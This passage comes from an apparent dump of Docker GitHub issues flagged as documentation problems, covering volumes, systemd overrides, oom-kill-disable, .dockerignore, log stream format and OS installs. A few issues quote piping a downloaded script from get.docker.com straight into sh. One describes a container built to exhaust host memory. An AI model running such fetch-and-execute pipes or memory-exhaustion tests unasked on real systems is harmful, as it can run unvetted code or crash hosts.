/Users/rpetty/.boot2docker/certs/boot2docker-vm/ca.pem \n> Writing /Users/rpetty/.boot2docker/certs/boot2docker-vm/cert.pem \n> Writing /Users/rpetty/.boot2docker/certs/boot2docker-vm/key.pem \n> Your environment variables are already set correctly.\n\nThis might only be on fresh installs. I tried running boot2docker via the Mac 'applications', then I tried as the instructions say to start via the cli. In either case, it did not show the environment variables. If its only during the vary first time (like during initial set up, then maybe mention that.) Could be something else, not sure yet.\n\nRegards.\n\nRon\n"},{"labels":["documentation"],"text":"https://docs.docker.com/userguide/dockervolumes/\n\nUnder \"Adding a data volume\" you create a volume.  You then go to confirm it via the next section \"Locating a volume\".  When I run 'docker inspect web', I see similar output but not exact.  I see the following:\n\n```\n...\n    \"Volumes\": {\n        \"/webapp\": \"/mnt/sda1/var/lib/docker/volumes/d2c56f0880cb121190e0d5b50c98c57d241109f37139d995da55883b7955427b/_data\"\n    },\n    \"VolumesRW\": {\n        \"/webapp\": true\n    },\n...\n\"Volumes\": {\n            \"/webapp\": {}\n        },\n...\n```\n\nMight want to clarify when you scroll up to see results the first 'Volumes' is not the one showing in the article, you need to scroll further up to see the detailed ones.  The empty Volumes is under the 'Config' block.  I am not sure what it is or represents.  Might just want to add a warning about seeing that or explain what it is.\n\nRegards.\n\nRon\n"},{"labels":["documentation",null],"text":"Using the `docker.service` from here and creating a drop-in  `/etc/systemd/system/docker.service.d/override.conf` to tweak command line parameters (as documented at https://docs.docker.com/articles/systemd/)\n\n```\n[Service]                                                                                                                       \nExecStart=/usr/bin/docker -d -H fd:// --bip=172.17.42.1/16  \n```\n\nends up with systemd refusing to start the daemon:\n\n```\ndocker.service has more than one ExecStart= setting, which is only allowed for Type=oneshot services. Refusing. \n```\n\nWhat is the recommended way to tweak the daemon command-line?\n"},{"labels":["documentation"],"text":"The guide here on the docker documentation (https://docs.docker.com/articles/b2d_volume_resize/) suggests using the gparted livecd iso, however, the current version does not work. Others have experienced this problem too, see: https://gist.github.com/joost/a7cfa7b741d9d39c1307\n\nVersion of gparted livecd: gparted-live-0.22.0-2-i586.iso\nVersion of boot2docker:\nBoot2Docker-cli version: v1.6.0\nGit commit: 9894ae9\n"},{"labels":["documentation"],"text":"Please provide documentation on how to properly create a bind between the container and the host machine. \n"},{"labels":["documentation",null,null,null],"text":"While it's no secret I've been hugely against this feature since back when it was just a proposal/PR (#12528/#11034), upon further investigation, it seems that the feature was implemented without much understanding, as proven by the fact that it doesn't even work :-)\n\nOk, so first subject, it doesn't work (docker 1.7.0):\nI don't know where docker thinks it's setting the cgroup parameter to disable the oom killer, but it's not on the cgroup used by the container.\n\n```\n# docker run -i --privileged --oom-kill-disable fedora:20 bash <<'EOF' \nmount -n -t tmpfs -o uid=0,gid=0,mode=0755 cgroup /sys/fs/cgroup\nmkdir /sys/fs/cgroup/memory\nmount -n -t cgroup -o memory cgroup /sys/fs/cgroup/memory\nmemcgpath=\"/sys/fs/cgroup/memory/$(awk -F: '$2 == \"memory\" { print $3 }' < /proc/1/cgroup)\"\necho \"memcgpath=$memcgpath\"\ncat $memcgpath/memory.oom_control\nEOF\n\nmemcgpath=/sys/fs/cgroup/memory//system.slice/docker-dc1408974e62968ff7e73fe3206045a98a540a0f455d864677be5e9a47d76cc5.scope\noom_kill_disable 0\nunder_oom 0\n```\n\nSecondly, the cgroup oom_kill_disable setting only does anything if a cgroup memory limit is also in place. Currently nothing enforces or advises the oom-kill-disable option only be used in conjunction with a memory limit.\n\nThirdly, using this flag requires manual intervention if the container does hit an OOM condition. The flag does prevent the process from being killed, but the process hangs instead (goes into defunct state). This means manual intervention is required to either kill the process/container, or to increase the memory limits. If you want to increase the limits, you have to go mucking around in the cgroup filesystem. So realistically, the action to take here is to manually kill the container.\nTo compound this, the fact that the process has been sent defunct is not easily observable. From the perspective of someone using the docker client, the container is still running, the processes inside it are still there, they just stop responding.\n\n&nbsp;\n\nHere's a little test container I created for this: [phemmer/do-oom](https://registry.hub.docker.com/u/phemmer/do-oom/) ([github](http://github.com/phemmer/docker-do-oom))\nThe container runs a process which allocates 20gb of memory, and then tries to use that 20gb (which invokes OOM).\n**NOTE**: I do not advise running this container on a system which you care about. The OOM killer is very indiscriminate, and can kill anything. Also don't run it on a system with swap enabled, or the entire system will likely come grinding to a halt.\n\nThe first example, we run the container with oom killer (supposedly) disabled:\n\n```\n# docker run -ti --oom-kill-disable do-oom \nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\nUsed 524288000 bytes\nUsed 629145600 bytes\nUsed 734003200 bytes\nUsed 838860800 bytes\nUsed 943718400 bytes\nUsed 1048576000 bytes\nUsed 1153433600 bytes\nUsed 1258291200 bytes\nUsed 1363148800 bytes\nUsed 1468006400 bytes\nUsed 1572864000 bytes\nUsed 1677721600 bytes\nUsed 1782579200 bytes\nUsed 1887436800 bytes\nUsed 1992294400 bytes\nUsed 2097152000 bytes\nUsed 2202009600 bytes\nUsed 2306867200 bytes\nKilled\n#\n```\n\nHere we see the container was killed due to OOM.\n\n&nbsp;\n\nNow we set a limit of 500M\n\n```\n# docker run -ti --oom-kill-disable -m 500M do-oom \nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\nKilled\n#\n```\n\n&nbsp;\n\nNow lets run it with the fix enabled, but no memory limit:\n\n```\n# docker run -ti --oom-kill-disable --privileged do-oom fix do-oom\nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\nUsed 524288000 bytes\nUsed 629145600 bytes\nUsed 734003200 bytes\nUsed 838860800 bytes\nUsed 943718400 bytes\nUsed 1048576000 bytes\nUsed 1153433600 bytes\nUsed 1258291200 bytes\nUsed 1363148800 bytes\nUsed 1468006400 bytes\nUsed 1572864000 bytes\nUsed 1677721600 bytes\nUsed 1782579200 bytes\nUsed 1887436800 bytes\nUsed 1992294400 bytes\nUsed 2097152000 bytes\nUsed 2202009600 bytes\nUsed 2306867200 bytes\nUsed 2411724800 bytes\n#\n```\n\nStill was killed\n\n&nbsp;\n\nNow we run it with a memory limit, and the fix enabled:\n\n```\n# docker run -ti --oom-kill-disable -m 500M --privileged do-oom fix do-oom \nmallocs complete\nUsed 0 bytes\nUsed 104857600 bytes\nUsed 209715200 bytes\nUsed 314572800 bytes\nUsed 419430400 bytes\n```\n\nHere the process just hangs as it's gone defunct. CTRL+C doesn't work, and we have to detach & kill the container.\n\n---\n\n```\n# docker version\nClient version: 1.7.0\nClient API version: 1.19\nGo version (client): go1.4.2\nGit commit (client): 0baf609\nOS/Arch (client): linux/amd64\nServer version: 1.7.0\nServer API version: 1.19\nGo version (server): go1.4.2\nGit commit (server): 0baf609\nOS/Arch (server): linux/amd64\n\n# docker info\nContainers: 107\nImages: 376\nStorage Driver: btrfs\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.18.1-gentoo\nOperating System: Gentoo/Linux\nCPUs: 4\nTotal Memory: 7.512 GiB\nName: gadget\nID: KLI3:BPWQ:CK45:NJCL:ULCH:BV6Z:XDFM:YKTZ:EZ7D:UBE7:ZQCK:HOGN\nUsername: phemmer\nRegistry: https://index.docker.io/v1/\n\n# uname -a\nLinux gadget 3.18.1-gentoo #1 SMP Sun Dec 21 12:15:16 EST 2014 x86_64 Intel(R) Core(TM) i7-3517U CPU @ 1.90GHz GenuineIntel GNU/Linux\n```\n"},{"labels":["documentation"],"text":"In the [Dockerfile best practices](https://docs.docker.com/articles/dockerfile_best-practices/) documentation, we read:\n\n> In the case of the ADD and COPY instructions, the contents of the file(s) being put into the image are examined. Specifically, a checksum is done of the file(s) and then that checksum is used during the cache lookup. If anything has changed in the file(s), including its metadata, then the cache is invalidated.\n\nThe first sentence is incomplete and misleading, _files_, _files contents_, and _files contents and metadata_ are used interchangeably, but there is actually only the latter. The purpose of mentioning the checksum is unclear, and mentioning it breaks the logical connection between the first and and the third sentence. A better wording would be:\n\n> In the case of the ADD and COPY instructions, the files being put into the image are examined and if anything has changed in their contents or their metadata, then the cache is invalidated. The comparison mechanism actually uses a checksum deduced from the files contents and metadata. Therefore, in some extremely rare occurrences, some cache entry might not be invalidated as expected.\n\n---\n\n```\ndocker version:     Not relevant,\ndocker info:          this is about \nuname -a:                   the website\n```\n"},{"labels":["documentation",null],"text":"YOu have a dangling link in line 80 of docs/reference/commandline/run.md:\n\n```\nThe `docker run` command can be used in combination with `docker commit` to\n[*change the command that a container runs*](#commit-an-existing-container).\n```\n\nThis should probably point to docs/reference/commandline/commit.md,\nbut I'm not sure exactly how that link should look (there didn't seem\nto be any examples in the existing run.md document).\n\nIdentified here: https://github.com/docker/docker/pull/13987\n"},{"labels":["documentation",null],"text":"docs/userguide/dockervolumes.md\n\nSee https://github.com/docker/docker/pull/14235 for discussion\n"},{"labels":["documentation",null,null],"text":"We have a document for reference/run which looks like it might be better suited as  a \"how to use run\" and the commandline/run.md file which is actually a reference.\n\nNeed to take a closer look and see what the intention was in the original design and solve it.\n\n![image](https://cloud.githubusercontent.com/assets/1347209/8503836/a61aa1de-217a-11e5-92bc-2c79777e6505.png)\n"},{"labels":["documentation"],"text":"I am confused about how dockerignore works.  I think it needs a more formal specification, and/or the examples should get into tricky cases more.  Here is a slightly pedantic list of some unclear things in the online documentation:\n\n\"Filepaths in .dockerignore are absolute with the current directory as the root.\"  Yet in the example .dockerignore file you give, either all or some of the patterns only match relative paths (depending on whether a leading asterisk can match the empty string).  I think what is meant is that filepaths are interpreted relative to the current directory but as if a chroot command had made that directory the root?\n\n\"the search is not recursive\".  What does this mean?\n\n\"Globbing (file name expansion) is done using Go’s filepath.Match rules.\"  In the linked documentation, we read that asterisk \"matches any sequence of non-Separator characters\" (which means characters other than '/'?) and that \"Match requires pattern to match all of name, not just a substring\".  Yet in the example file, you say that the pattern \"*.md\" will exclude all markdown files.  All four of these claims can't be true.\n\n\"Formats like [^temp*] are ignored.\"  I don't understand what this means. Is it a qualification of the claim that globbing is done using Go's filepath.Match rules?\n"},{"labels":["documentation"],"text":"People are using `https://get.docker.com/ubuntu/` to install docker and end up with problems because it does not install aufs (Example : https://github.com/docker/docker/issues/14204). https://get.docker.com/ubuntu/ should just redirect to `https://get.docker.com/`, so that people install docker on ubuntu correctly.\n\nCC : @moxiegirl @thaJeztah @jfrazelle \n"},{"labels":["documentation"],"text":"Is there a documentation/specification available about the stream format returned by accessing the `GET /containers/(id)/logs` endpoint of the REST API?\n\nIt looks like each line is prefixed with `8 bytes` of binary data, which might encode line length, a time code, line codes, char offsets, or ... but I haven't found any documentation about that format (at least not in the [docker remote api v1.19 docs](https://docs.docker.com/reference/api/docker_remote_api_v1.19/)).\n\nI am running:\n\n```\nDocker version 1.7.0, build 0baf609\n```\n\nE.g.: running this request:\n\n```\ncurl \"http://localhost:2375/containers/8c579/logs?follow=true&stderr=true&stdout=true&timestamps=true\"\n```\n\ngives this result (note the garbage characters in front of the time stamps):\n\n``````\n☺      ½2015-06-25T18:10:22.916242788Z 1:C 25 Jun 18:10:22.914 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf\n☺      e2015-06-25T18:10:22.921992353Z                 _._\n☺      e2015-06-25T18:10:22.922012790Z            _.-``__ ''-._\n☺      g2015-06-25T18:10:22.922020284Z       _.-``    `.  `_.  ''-._           Redis 3.0.2 (00000000/0) 64 bit\n☺      e2015-06-25T18:10:22.922026895Z   .-`` .-```.  ```\\/    _.,_ ''-._\n☺      b2015-06-25T18:10:22.922033469Z  (    '      ,       .-`  | `,    )     Running in standalone mode\n☺      R2015-06-25T18:10:22.922039644Z  |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379\n☺      N2015-06-25T18:10:22.922045827Z  |    `-._   `._    /     _.-'    |     PID: 1\n☺      e2015-06-25T18:10:22.922052038Z   `-._    `-._  `-./  _.-'    _.-'\n☺      e2015-06-25T18:10:22.922057983Z  |`-._`-._    `-.__.-'    _.-'_.-'|\n☺      e2015-06-25T18:10:22.922064221Z  |    `-._`-._        _.-'_.-'    |           http://redis.io\n☺      e2015-06-25T18:10:22.922070404Z   `-._    `-._`-.__.-'_.-'    _.-'\n☺      e2015-06-25T18:10:22.922078420Z  |`-._`-._    `-.__.-'    _.-'_.-'|\n☺      e2015-06-25T18:10:22.922084460Z  |    `-._`-._        _.-'_.-'    |\n☺      e2015-06-25T18:10:22.922090389Z   `-._    `-._`-.__.-'_.-'    _.-'\n☺      e2015-06-25T18:10:22.922096333Z       `-._    `-.__.-'    _.-'\n☺      e2015-06-25T18:10:22.922102155Z           `-._        _.-'\n☺      e2015-06-25T18:10:22.922108076Z               `-.__.-'\n☺       2015-06-25T18:10:22.922113903Z\n☺      ]2015-06-25T18:10:22.923169420Z 1:M 25 Jun 18:10:22.923 # Server started, Redis version 3.0.2\n``````\n"},{"labels":["documentation"],"text":"https://docs.docker.com/reference/run/\n\nThe table format is messy after the paragraph shown as below.\n\n> In addition to --privileged, the operator can have fine grain control over the capabilities using --cap-add and --cap-drop. By default, Docker has a default list of capabilities that are kept. The following table lists the Linux capability options which can be added or dropped.\n\nI have checked other tables in `run` reference - **markdown** issue - has been converted to **html** format. \n"},{"labels":["documentation"],"text":"`Docker version 1.6.2, build 7c8fca2`\n\nFrom documentation:\nhttps://docs.docker.com/reference/builder/#volume\n\n> The `docker run` command initializes the newly created volume with any data that exists at the specified location within the base image.\n\n(1) This works as excepted:\n\n```\nRUN mkdir -p /foo/bar && touch /foo/bar/test.txt\nVOLUME /foo/bar\n```\n\n(2) but this not:\n\n```\nVOLUME /foo/bar\nRUN touch /foo/bar/test.txt\n```\n\nFile in image is created successfully, but when container is created `/foo/bar` becomes empty.\nStrangely, (2) seems to work when `VOLUME` part is taken from cache, and `RUN` part is freshly appended to Dockerfile. But full rebuild of image breaks this.\n\n---\n\nBUG REPORT INFORMATION\n\nUse the commands below to provide key information from your environment:\n\ndocker version:\n\n```\ndocker@boot2docker:~$ docker version\nClient version: 1.6.2\nClient API version: 1.18\nGo version (client): go1.4.2\nGit commit (client): 7c8fca2\nOS/Arch (client): linux/amd64\nServer version: 1.6.2\nServer API version: 1.18\nGo version (server): go1.4.2\nGit commit (server): 7c8fca2\nOS/Arch (server): linux/amd64\n```\n\ndocker info:\n\n```\ndocker@boot2docker:~$ docker info\nContainers: 13\nImages: 195\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 221\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nKernel Version: 4.0.3-boot2docker\nOperating System: Boot2Docker 1.6.2 (TCL 5.4); master : 4534e65 - Wed May 13 21:24:28 UTC 2015\nCPUs: 2\nTotal Memory: 1.957 GiB\nName: boot2docker\nID: EDZ6:D6NA:EKMP:HL4L:LUQ3:MGLZ:CAEW:EXEZ:HPJU:Q7RT:3CL3:TBNI\nDebug mode (server): true\nDebug mode (client): false\nFds: 54\nGoroutines: 88\nSystem Time: Sat May 30 08:05:47 UTC 2015\nEventsListeners: 1\nInit SHA1: 7f9c6798b022e64f04d2aff8c75cbf38a2779493\nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\n```\n\nuname -a:\n\n```\ndocker@boot2docker:~$ uname -a\nLinux boot2docker 4.0.3-boot2docker #1 SMP Wed May 13 20:54:49 UTC 2015 x86_64 GNU/Linux\n```\n\nProvide additional environment details (AWS, VirtualBox, physical, etc.):\n- VirtualBox, boot2docker\n\nList the steps to reproduce the issue:\nDescribe the results you received:\nDescribe the results you expected:\nSee above.\n\n----------END REPORT ---------\n# ENEEDMOREINFO\n"},{"labels":["documentation"],"text":"Here is what you get when you search in the docker repo for the string `\"VolumesFrom\"`: https://github.com/docker/docker/search?utf8=%E2%9C%93&q=VolumesFrom\n\nThe issue is that most of the response formats ascribed to docker inspect say that the endpoint will return something like\n\n`\"VolumesFrom\":\"\"`\n\nThis is untrue - as of docker 1.7 (and probably much earlier), docker returns either `null` or something like `[\"contrainerid\"]` as the value for that key.\n\nThe tricky part is that early docker (1.0) used to accept a string as input for `VolumesFrom` in the remote api, before a change (maybe around 1.4?) had it take an array instead. I'm not sure when both the input and output changed, but someone more knowledgeable should probably retroactively correct the documentation thereof.\n\nI stumbled across this issue because docker 1.7's remote API started **throwing errors** when passed string values for `VolumesFrom` - it used to silently accept the empty string as a valid input. I don't count this as a bug, but it was certainly surprising.\n\n_As an aside there has GOT to be a better way to arrange all of these docs besides a series of increasingly large and self-contradictory markdown files._\n"},{"labels":["documentation",null,null,null],"text":"Using this issue to solicit feedback on the exciting new networking experimental features introduced during the Docker 1.7 / 1.8 release time-frame.\nhttps://github.com/docker/docker/blob/master/experimental/networking.md\n"},{"labels":["documentation"],"text":"I'm a newbie and trying to contribute. Where I could find the docs file for getting started for linux https://docs.docker.com/linux/started/\nand the getting started link in https://docs.docker.com/linux/started/ is broken\n"},{"labels":["documentation"],"text":"docs/reference/run.md in section \"Overriding Dockerfile image defaults\" implies that the docker run --expose option overrides the EXPOSE command in a Dockerfile. It does not. docker run --expose simply adds to the list of exposed ports. It does not override the Dockerfile EXPOSE list of ports.\n\nIf you think this is trivial, this actually cost me a cycle, because I _assumed_ from the doc that I could put an EXPOSE command in the Dockerfile, and override it later. \n\nThere should be a --unexpose option but that's a different issue. This issue is just about correcting the doc.\n"},{"labels":["documentation"],"text":"According to the [documentation](https://docs.docker.com/userguide/dockervolumes/#data-volumes), new volumes should be initialized with the contents of the base image in the volume location.\n\nThis indeed works when running `docker -v /path/inside/container ...`, but not when running `docker -v /path/on/host:/path/inside/container ...`.\n\nThe documentation doesn't mention there should be a different behavior, so we should either:\n1. Update the documentation to mention that the behavior is different when the volume is bound to a host directory\n2. Find a way to initialize the volume when binding it to a host directory. Perhaps if the host directory does not initially exist, or with an extra `docker` flag?\n"},{"labels":["documentation",null],"text":"Setting pid=host or ipc=host sets the \"disabled\" selinux policy. This should be documented (or fixed), as it is neither obvious nor apparent. A warning message on usage may also be appropriate.\n\nVerified in 1.7.0-rc2\n"},{"labels":["documentation"],"text":"For the Fedora 21 and later installation instructions, I was thinking that updating the instructions to reflect the dnf update in Fedora 22 would be useful and helpful to users. \n"},{"labels":["documentation",null],"text":"According to the now (official) dockerbench rule [#2.7](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.6_Benchmark_v1.0.0.pdf) \"`2.7 Do not use the aufs storage driver`\" Its seems recommended to just use the devicemapper. Shouldn't the [magic install url](https://get.docker.io/) reflect this and _not_ install the -extra linux image packages in order to allow for AUFS?\n\nI'd say just dropping the aufs packages and requirements for (at least) Ubuntu 14.04+ would suffice?\n\nThanks!\n"},{"labels":["documentation",null],"text":"Was running through the tutorial and accidentally did:\n`docker run learn/ping www.google.com`\n\ninstead of\n`docker run learn/ping ping www.google.com` (as the answer states)\n\nMy mistake validated as a incorrect answer in the emulator with a popup claiming it was correct.\n\n![dockerissue](https://cloud.githubusercontent.com/assets/1414307/7973411/ff3fcb82-0a22-11e5-90ce-eeb4faefaa8a.png)\n"},{"labels":["documentation"],"text":"He reports a TLS error and suggests the work around is to start the daemon directly.  Using 14.04.2 \n\nhttps://plus.google.com/116544552139899093398/posts/NFE4ubBAabo\n"},{"labels":["documentation"],"text":"The MAINTAINERS file says all decisions can be expressed as a pull request (https://github.com/docker/docker/blob/master/MAINTAINERS#L76). But I was unable to find any documentation explaining the release cadence (when is a minor as in semver's MAJOR.MINOR.PATCH). The closes thing I could find was https://github.com/docker/docker/blob/master/project/RELEASE-CHECKLIST.md which discusses what to do once you know you are working on making a release\n"},{"labels":["documentation",null],"text":"As of https://github.com/docker/docker/commit/1df87b95066198c30312147393c18e0be0564fd0 the `create container` remote api endpoint still accepts a `HostConfig` as POST body, but a [code comment indicates](https://github.com/docker/docker/blob/master/daemon/start.go#L27) that the HostConfig should only be used for `start container`.\n\nThe relevant docs produced some confusion (see #13466) after the request body description had been removed and [added](https://github.com/docker/docker/commit/ac12c8053779d36409e248f41c4d80ef0e4fbe9f) again.\n\nI propose to explictly indicate in the docs that the HostConfig is only allowed on `start container` for backwards compatibility.\n"},{"labels":["documentation"],"text":"![image](https://cloud.githubusercontent.com/assets/1347209/7888740/8df9e62e-05ef-11e5-8d55-c67425ba7039.png)\n"},{"labels":["documentation"],"text":"@moxiegirl can we add @justone tool to documentation somewhere and reference to docker images.\n@justone Thank you! This is so cool!\n\nSee https://github.com/docker/docker/pull/12333\n"},{"labels":["documentation"],"text":"A little email just to tell you that the documentation about installing Docker on Debian Jessie (https://docs.docker.com/installation/debian/) is not up-to-date as it seems that the docker.io does not exist anymore in backports.\n\nThe installation through wget -qO- https://get.docker.com/ | sh works though. I would just add a mention about systemctl enable docker to have Docker starts at each machine start.\n\nKind regards,\nPhilippe\n"},{"labels":["documentation",null,null],"text":"doc: docker images should explain repository column and when none. Or provide a link to where these are explained.\n\nhttps://docs.docker.com/reference/commandline/cli/#images\n\n`docker images` starts \"The default docker images will show all top level images, their repository and tags, and their virtual size.\"  It goes on to do a good job of explaining the last item \"virtual size\".\n"},{"labels":["documentation",null],"text":"---- TRIAGE -----\n\n**Problem:** Systemd is not supported on RHEL6 kernels (and this won't be fixed). As such containers which include systemd will not work.\n\n**Resolution:** Update docs to reflect issues attempting to run systemd based images on kernels < 3.8\n\n---- END TRIAGE ----\n\nHi,\n\nthis is more a documentation / information related problem:\n\n\"Develop, Ship and Run Any Application, Anywhere\" NOT true for:\n- Anywhere = [Redhat | CentOS] 6) AND\n- Application dependent on systemd\n\nThis should be at least mentioned in the [install description](https://docs.docker.com/installation/rhel/) for RH6.\n\n_In our case we realized this only when we wanted to deploy ready, working containerized Apps to production at a customer. Their operations and security departments disallows major Kernel or OS upgrades so we have a real problem - which bit us unexpectedly, due to the claim that the docker enabled series 2 RH kernel is fine._\n# Description of problem:\n\nAny systemd enabled container can't start on RH 6, with systemd as Pid 1\n- With --privileged or without\n- With -e 'container:docker' or without\n\nThe root cause is the missing /sys/fs/cgroup interface of the kernel - which can't be created there (sysfs) - allthough all cgroups are actually supported, mounted to /cgroup\n\nI'm clear that docker supports the one container per process approach but for various reasons (many legacy) we require a full init system - and systemd is the default in Linux these days.\n## `docker version`:\n\nTried 1.3.0 and also Docker version 1.6.2, build 7c8fca2\n## `docker info`:\n\n[root@ip-172-30-0-24 ~]# docker info\nContainers: 19\nImages: 11\nStorage Driver: devicemapper\n Pool Name: docker-202:80-3145731-pool\n Pool Blocksize: 65.54 kB\n Backing Filesystem: extfs\n Data file:\n Metadata file:\n Data Space Used: 2.375 GB\n Data Space Total: 107.4 GB\n Data Space Available: 105 GB\n Metadata Space Used: 2.879 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.145 GB\n Udev Sync Supported: false\n Library Version: 1.02.82-git (2013-10-04)\nExecution Driver: native-0.2\nKernel Version: 2.6.32-504.el6.x86_64\nOperating System: <unknown> (containerized)\nCPUs: 1\nTotal Memory: 994.7 MiB\nName: ip-172-30-0-24.eu-west-1.compute.internal\nID: IZBN:IMN5:OGHI:L2LQ:IVB7:RBPC:7KPS:KKSW:ZKZF:SHMD:EPNF:ABXB\n## `uname -a`:\n\nLinux ip-172-30-0-24.eu-west-1.compute.internal 2.6.32-504.el6.x86_64 #1 SMP Tue Sep 16 01:56:35 EDT 2014 x86_64 x86_64 x86_64 GNU/Linux\n## Environment details (AWS, VirtualBox, physical, etc.):\n\n[root@ip-172-30-0-24 ~]# cat /etc/redhat-release\nRed Hat Enterprise Linux Server release 6.6 (Santiago)\nReproduced on AWS (ami-9cfd53eb)\n\nOn customer site its in vmware server.\n## How reproducible:\n\n100% \n## Steps to Reproduce:\n\nWe tried various ways. Here the most naive ones:\n\na) # docker run -ti --privileged -e \"container=docker\" debian:jessie  /sbin/init\n-> Failed to mount tmpfs at /sys/fs/cgroup: No such file or directory\n\nb) # docker run -ti --privileged -e \"container=docker\" -v '/cgroup:/sys/fs/cgroup' debian:jessie  /sbin/init\n-> FATA[0000] Error response from daemon: Cannot start container 3c37ba2028310fcfbe7fa3e8f8f084ecb28670d7b1566e4865d3c9ff0eeca590: [8] System error: mkdir /var/lib/docker/devicemapper/mnt/3c37ba2028310fcfbe7fa3e8f8f084ecb28670d7b1566e4865d3c9ff0eeca590/rootfs/sys/fs/cgroup: no such file or directory\n\nc) # ./docker-1.3.0 run -t -i --privileged --lxc-conf=\"lxc.mount.auto = proc:rw sys:rw cgroup-full:mixed\" -e 'container=docker' debian:jessie  /sbin/init\n-> Failed to mount tmpfs at /sys/fs/cgroup: No such file or directory\n\nd) # ./docker-1.3.0 run -it --privileged cloudbees/archbase\n-> Failed to mount tmpfs at /sys/fs/cgroup: No such file or directory\n\ne) # ./docker-1.3.0 run -it cloudbees/archbase\n-> Failed to mount tmpfs at /run: Operation not permitted\n## Expected Results:\n\nsystemd as pid1 inside (as working with ubuntu as base OS or also when we upgrade the kernel according to http://nareshv.blogspot.com/2014/02/installing-docker-08-version-on-centos.html  (which is not allowed in production))\n## Additional info:\n- https://github.com/jpetazzo/dind/issues/17\n- http://developerblog.redhat.com/2014/05/05/running-systemd-within-docker-container/ (which is only working on RH7)\n- https://registry.hub.docker.com/u/offlinehacker/nixos/ (does also not work)\n\nIn general I want to say that the problem is **not a bug in docker as such**. Since it is also not possible to get systemd up on RH6 using lxc.\n\nBut it should be made very clear to users of dockers that their containers can't work on default RH 6 - if systemd is used as init system inside.\n\nPS: If there is any workaround whatsoever (dind?) I would be very happy if I'm proven wrong with the main claim of this issue.\n"},{"labels":["documentation"],"text":"I've checked docker --version before and after running the command and I still have version `Docker version 1.5.0, build a8a31ef`\n\n```\nwget -N https://get.docker.com/ | sh\n--2015-05-15 11:09:03--  https://get.docker.com/\nResolving get.docker.com (get.docker.com)... 162.242.195.82\nConnecting to get.docker.com (get.docker.com)|162.242.195.82|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 7452 (7.3K) [text/plain]\nSaving to: ‘index.html’\n\n100%[===============================================================================================================================================================================>] 7,452       --.-K/s   in 0s\n\n2015-05-15 11:09:04 (1.46 GB/s) - ‘index.html’ saved [7452/7452]\n```\n\n```\n#uname -a\nLinux UBUNTU4117V 3.13.0-49-generic #83-Ubuntu SMP Fri Apr 10 20:11:33 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n```\n# docker info\nContainers: 0\nImages: 129\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 129\nExecution Driver: native-0.2\nKernel Version: 3.13.0-49-generic\nOperating System: Ubuntu 14.04.2 LTS\nCPUs: 2\nTotal Memory: 15.67 GiB\nName: UBUNTU4117V\nID: QTIT:JXGL:A6XO:7YXZ:5LKY:PCKL:EG7T:FD4A:CZID:UE72:A77K:3WAY\nWARNING: No swap limit support\n```\n"},{"labels":["documentation"],"text":"The docker-pull man page usage line is missing an entry for alternate registries.  Right now it looks like:\n\ndocker pull [-a|--all-tags[=false]] [--help] NAME[:TAG]\n\nbut should probably look like:\n\ndocker pull [-a|--all-tags[=false]] [--help] [REGISTRY_HOST[:REGISTRY_PORT]/]NAME[:TAG]\n\nThe docker-push man page has a more correct usage line which includes alternate registries, but it's a little misleading because it looks like:\n... NAME[:TAG] | [REGISTRY_HOST[:REGISTRY_PORT]/]NAME[:TAG]\n"},{"labels":["documentation",null,null],"text":"Windows installation step 2 has a typo change \"or Windows\" to \"for Windows\"\n"},{"labels":["documentation"],"text":"I'm not sure where the problem lies, but the upgrade documentation for Ubuntu is messed up.\n\nHere's what the docs say at (http://docs.docker.com/installation/ubuntulinux/#upgrade-docker):\n\n```\nUpgrade Docker\nTo install the latest version of Docker, use the standard -N flag with wget:\n\n$ wget -N https://get.docker.com/ | sh\n```\n\nExecuting this command when you have Docker installed does nothing - it simply downloads the contents of https://get.docker.com/index.html and saves it in the current directory as `index.html`.\n\nIf you execute the downloaded script, you get a warning message:\n\n```\nWarning: \"docker\" or \"lxc-docker\" command appears to already exist.\nPlease ensure that you do not already have docker installed.\nYou may press Ctrl+C now to abort this process and rectify this situation.\n```\n\nBeing the cautious sort, I cancelled, then attempted to uninstall (via `apt-get purge`) docker before proceeding. This worked.\n\nBut I don't know if I needed to do that. The warning above seems to indicate that I did need to, but I wouldn't know that from the documentation.\n\nFirst,\n\nThe command given in the documentation needs to be changed,\n\nthen either:\n1. the documentation needs to advise users to uninstall docker before attempting to upgrade, or\n2. the warning message in the install script needs to be amended (or dropped) if it's not accurate\n\nThanks\n"},{"labels":["documentation",null],"text":"Hi,\n\nI've look a bit at the label documentation, the `labels-custom-metadata.md` file (and it [online version](https://docs.docker.com/userguide/labels-custom-metadata/)) and it seems something has not been updated — or at least it is not working.\n\nAssuming 4fa6e0f0c678 is a container, the command specified in the document won't work as expected.\n\n``` bash\n$ docker inspect -f \"{{json .Labels }}\" 4fa6e0f0c678\nnull\n$ docker inspect -f \"{{json .Config.Labels }}\" 4fa6e0f0c678\n{\"Vendor\":\"ACME Incorporated\",\"com.example.is-beta\":\"\",\"com.example.version\":\"0.0.1-beta\",\"com.example.release-date\":\"2015-02-12\"}\n```\n\nAnd it's not the same format to use for inspect on images, the format would  be `{{json .ContainerConfig.Labels }}`.\n\nCorrect me if I'm wrong, but for now, I'll send a PR to fix that :)\n"},{"labels":["documentation"],"text":"Hi,\n\nafter the release of Debian jessie the package docker.io doesn't exists in the main or backports repository of jessie anymore.\nThe docs should provide a valid and official way to install docker on jessie.\n\nMy currently workaround is to use the docker repository which is provided for ubuntu.\n\n``` bash\napt-get install apt-transport-https\napt-key adv --keyserver 